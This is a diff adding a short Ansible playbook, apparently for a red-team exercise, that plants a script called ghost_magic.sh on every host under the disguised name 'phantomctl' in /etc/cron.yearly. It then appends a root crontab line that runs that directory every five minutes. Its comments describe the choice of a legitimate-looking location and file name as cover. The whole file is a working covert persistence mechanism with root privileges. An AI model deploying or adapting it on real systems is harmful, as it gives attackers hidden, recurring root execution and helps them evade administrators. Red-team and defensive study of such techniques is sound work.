@@ -1,0 +1,24 @@
+---
+- name: Set up ghost_magic.sh to run every 5 minutes in /etc/cron.yearly
+  hosts: all
+  become: yes  # Escalated privileges needed
+  tasks:
+    - name: Create the /etc/cron.yearly directory #Imitate legitimate directory
+      file:
+        path: /etc/cron.yearly
+        state: directory
+        mode: '0755' #executible by root
+
+    - name: Copy the ghost_magic.sh script to the /etc/cron.yearly directory #Will be placed on all linux boxes
+      copy:
+        src: ./ghost_magic.sh   # Path to the script on the Ansible control machine (should be in the same directory)
+        dest: /etc/cron.yearly/phantomctl  # Copy to /etc/cron.yearly (change name to be slightly less obvious but stil clearly red team)
+        mode: '0755'  # Ensure the script is executable
+
+    - name: Add cron job to run /etc/cron.yearly every 5 minutes
+      lineinfile:
+        path: /etc/crontab
+        state: present
+        insertafter: EOF
+        line: "*/5 *   * * *  root  cd / && run-parts /etc/cron.yearly"
+
